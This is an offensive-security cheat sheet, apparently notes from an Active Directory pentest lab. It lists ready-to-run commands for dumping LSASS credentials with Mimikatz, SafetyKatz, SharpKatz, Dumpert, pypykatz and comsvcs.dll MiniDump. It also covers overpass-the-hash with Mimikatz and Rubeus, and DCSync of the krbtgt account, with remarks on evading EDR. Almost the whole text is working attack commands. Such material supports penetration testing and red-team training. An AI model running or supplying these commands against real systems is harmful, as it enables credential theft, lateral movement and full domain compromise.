# DUMP CREDENTIALS ON A LOCAL MACHINE USING MIMIKATZ
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'

# USING SAFETYKATZ (Minidump of lsass and PELoader to run Mimikatz)
SafetyKatz.exe "sekurlsa::ekeys"

# DUMP CREDENTIALS USING SHARPKATZ (C# port of some of Mimikatz Functionality)
SharpKatz.exe --Command ekeys

# DUMP CREDENTIALS USING DUMPERT (Direct System Calls and API unhooking)
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll, Dump)

# USING PYPYKATZ (Mimikatz functionality in Python)
pypykatz.exe live lsa

# USING comsvcs.dll // Usually flagged by a lot of EDRs
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full

# FROM LINUX MACHINE
Impacket and Physmem2profit

# OVERPASS THE HASH
Invoke-Mimikatz -Command '"sekurlsa:pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'

SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"

(The above commands start powershell o cmd session with a logon type 9) -> No user session

# OVERPASS THE HASH generate TOKENS from HASHES or KEYS 
# Get session
# IN A NORMAL CMD
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt

# IN AN ADMIN or ELEVATED SHELL
Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createonly:C:\Windows\System32\cmd.exe /show /ptt

# DCSync

#DCSync for US Domain
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"' 

SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"

By default, Domain Admins privileges are required to run DCSync
